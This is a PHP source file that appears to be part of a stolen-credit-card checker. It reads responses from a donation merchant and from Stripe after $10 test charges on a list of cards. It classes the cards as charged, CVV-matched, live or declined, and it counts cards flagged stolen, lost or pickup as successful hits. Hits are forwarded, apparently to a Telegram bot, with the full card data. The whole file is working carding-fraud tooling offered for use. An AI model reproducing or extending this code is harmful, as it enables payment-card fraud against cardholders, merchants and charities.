<?php

// telegram @isnotdev

if (empty($x)) {
 $x = "N/A";
}

$tsarg = "Charged 10$ ✅";
$ccnlive = "CCN Approved ✅";
$cvvmatch = "CVV Matched ✅";
$ccdec = "Declined ❌";
$ccerror = "Error ❗";

// -- merchant -- //
### CHARGED
if (strpos($resp, '"__typename":"Donation"')) {
 echo '<span class="approved">#CHARGED<br></span><span class="abcxyz">status: '.$tsarg.' <br>cc: '.$lista.'<br> result: Your card has been successfully charged. </span><br>';

 $artSender =
 "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: Charged $amt ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card has been successfully charged 10$.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
 chargeSender($chrg, $artSender);
}

### DECLINED
elseif (strpos($resp, "The card has expired. Check the expiration date or use a different card.")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: The card has expired. </span><br>';
} elseif (strpos($resp, "The card has been declined for an unknown reason.")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: The card has been declined. </span><br>';
} elseif (strpos($resp, 'Invalid account.')) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Invalid account. </span><br>';
} elseif (strpos($resp, "We were unable to process your order, please try again.")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: We were unable to process your order, please try again. </span><br>';
} elseif (strpos($resp, "There was a problem encountered while processing your donation.")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: There was a problem encountered while processing your donation. </span><br>';
} elseif ((strpos($resp, "Suspicious activity detected. Try again in a few minutes.")) || (strpos($resp, "Anti-spam triggered, please wait and try again later."))) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Suspicious activity detected. Try again in a few minutes </span><br>';
} elseif (strpos($resp, "Customer authentication is required to complete this transaction. Please complete the verification steps issued by your payment provider.")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: We are unable to authenticate your payment method. Please choose a different payment method and try again. </span><br>';
} elseif (strpos($resp, "Anti-fraud triggered, please wait and try again later.")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Anti-fraud triggered, please wait and try again later. </span><br>';
}
# TELEGRAM: @ARTERXSK
# DISCORD: @ARTERXSK#9210
// 盗まないでよクソ野郎！

// -- stripe -- //
### CHARGED
elseif (strpos($resp, '"status":"succeeded"')) {
 echo '<span class="approved">#CHARGED | '.$gateway.'<br></span><span class="abcxyz">cc: '.$lista.'<br>status: '.$tsarg.' <br> result: Your card has been successfully charged 10$. </span><br>';

 $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: Charged $amt$ ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card has been successfully charged 10$.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
 hitSender($w2s, $artSender);
}

### CVV
elseif (strpos($resp, '"cvc_check": "pass"')) {
 echo '<span class="approved">#CVV<br></span><span class="abcxyz">status: '.$cvvmatch.' <br>cc: '.$lista.'<br> result: CVC check passed </span><br>';

 $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CVV Matched ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: CVC_Check Passed.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
 hitSender($w2s, $artSender);
} elseif
 ((strpos($resp, "Your card zip code is incorrect.")) || (strpos($resp, "incorrect_zip"))) {
 echo '<span class="approved">#CVV<br></span><span class="abcxyz">status: '.$cvvmatch.' <br>cc: '.$lista.'<br> result: Your card zip code is incorrect </span><br>';

 $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CVV Matched ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card zip code is incorrect.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
 hitSender($w2s, $artSender);
} elseif
 (strpos($resp, "Thank you! For security reasons your order is currently being reviewed.")) {
 echo '<span class="approved">#CVV<br></span><span class="abcxyz">status: '.$cvvmatch.' <br>cc: '.$lista.'<br> result: CVV - Thank you! For security reasons your order is currently being reviewed. </span><br>';

 $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: Card Authorized ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Order is currently being reviewed.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
 hitSender($w2s, $artSender);
} elseif
 ((strpos($resp, "Your card does not support this type of purchase.")) || (strpos($resp, "transaction_not_allowed"))) {
 echo '<span class="approved">#CVV<br></span><span class="abcxyz">status: '.$cvvmatch.' <br>cc: '.$lista.'<br> result: Transaction not allowed. </span><br>';

 $artSender =
 "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CVV Matched ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card does not support this type of purchase.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
 hitSender($w2s, $artSender);
} elseif
 ((strpos($resp, "Your card has insufficient funds.")) || (strpos($resp, "insufficient_funds"))) {
 echo '<span class="approved">#CVV<br></span><span class="abcxyz">status: '.$cvvmatch.' <br>cc: '.$lista.'<br> result: Your card has insufficient funds. </span><br>';

 $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CVV Matched ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card has insufficient funds.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
 hitSender($w2s, $artSender);
}

### CCN
elseif ((strpos($resp, "security code is incorrect.")) || (strpos($resp, "incorrect_cvc")) || (strpos($resp, "Your card's security code is incorrect."))) {
 echo '<span class="approved">#CCN<br></span><span class="abcxyz">status: '.$ccnlive.' <br>cc: '.$lista.'<br> result: Your card’s security code is incorrect. </span><br>';

 $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card's security code is incorrect.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
 hitSender($w2s, $artSender);

}

### LIVE
elseif (strpos($resp, "stolen_card")) {
 echo '<span class="approved">#CCN<br></span><span class="abcxyz">status: '.$ccnlive.' <br>cc: '.$lista.'<br> result: Stolen card. </span><br>';

 $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Stolen Card.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
 hitSender($w2s, $artSender);
} elseif
 (strpos($resp, "lost_card")) {
 echo '<span class="approved">#CCN<br></span><span class="abcxyz">status: '.$ccnlive.' <br>cc: '.$lista.'<br> result: Lost Card. </span><br>';

 $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Lost Card.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
 hitSender($w2s, $artSender);
} elseif
 (strpos($resp, "pickup_card")) {
 echo '<span class="approved">#CCN<br></span><span class="abcxyz">status: '.$ccnlive.' <br>cc: '.$lista.'<br> result: Pickup card. </span><br>';

 $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Pickup Card.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
 hitSender($w2s, $artSender);
} elseif
 (strpos($resp, '"cvc_check": "fail"')) {
 echo '<span class="approved">#CCN<br></span><span class="abcxyz">status: '.$ccnlive.' <br>cc: '.$lista.'<br> result: CVC check fail. </span><br>';

 $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: CVC Check Failed.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
 hitSender($w2s, $artSender);
} elseif
 ((strpos($resp, "security code is invalid.")) || (strpos($resp, "invalid_cvc"))) {
 echo '<span class="approved">#CCN<br></span><span class="abcxyz">status: '.$ccnlive.' <br>cc: '.$lista.'<br> result: Your card’s security code is invalid.</span><br>';

 $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Security code is invalid.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
 hitSender($w2s, $artSender);
}

### DECLINED
elseif
 ((strpos($resp, "Your card was declined.")) || (strpos($resp, "card_declined")) || (strpos($resp, 'Your card was declined'))) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Your card was declined </span><br>';
} elseif ((strpos($resp, 'Your card has expired.')) || (strpos($resp, "expired_card"))) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Your card has expired </span><br>';
} elseif
 ((strpos($resp, "Your card number is incorrect.")) || (strpos($resp, "incorrect_number"))) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Your card number is incorrect </span><br>';
} elseif
 (strpos($resp, "generic_decline")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Generic declined </span><br>';
} elseif
 (strpos($resp, "Your card's expiration month is invalid")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Your card’s expiration month is invalid </span><br>';
} elseif
 (strpos($resp, "do_not_honor")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Do not honor </span><br>';
} elseif
 (strpos($resp, "processing_error")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Processing error </span><br>';
} elseif
 (strpos($resp, "service_not_allowed")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Service not allowed </span><br>';
} elseif
 (strpos($resp, '"cvc_check": "unchecked"')) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: CVC check unchecked </span><br>';
} elseif
 (strpos($resp, '"cvc_check": "unavailable"')) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: CVC unavailable </span><br>';
} elseif
 (strpos($resp, "parameter_invalid_empty")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Parameter invalid empty </span><br>';
} elseif
 (strpos($resp, "lock_timeout")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Lock timeout </span><br>';
} elseif
 ((strpos($resp, "three_d_secure_redirect")) || (strpos($resp, "requires_action"))) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: OTP Card Required.</span><br>';
} elseif
 (strpos($resp, "Card is declined by your bank, please contact them for additional information.")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Card is declined by your bank, please contact them for additional information </span><br>';
} elseif
 (strpos($resp, "missing_payment_information")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Missing payment information </span><br>';
} elseif
 (strpos($resp, "Payment cannot be processed, missing credit card number")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Payment cannot be processed, missing credit card number </span><br>';
} elseif
 (strpos($resp, "Transaction declined")) {
 echo '<span class="declined">#DECLINED<br></span><span class="abcxyz">status: '.$ccdec.' <br>cc: '.$lista.'<br> result: Transaction Declined.</span><br>';
}

### ERROR
elseif
 ((strpos($resp, "-1")) || (strpos($resp, 'api_key_expired'))) {
 echo '<span class="declined">#ERROR<br></span><span class="abcxyz">status: '.$ccerror.' <br>cc: '.$lista.'<br> result: API Down, try other gates. </span><br>';
} else {
 echo '<span class="declined">#ERROR<br></span><span class="abcxyz">status: '.$ccerror.' <br>cc: '.$lista.'<br> result: Unknown Error. </span><br>';
}

// echo '<span class="abcxyz">bypassing: '.$x.'</span><br>';
echo '<span class="abcxyz">checker: '.$owner.'</span><br>';

# TELEGRAM: @ARTERXSK
# DISCORD: @ARTERXSK#9210
// 盗まないでよクソ野郎！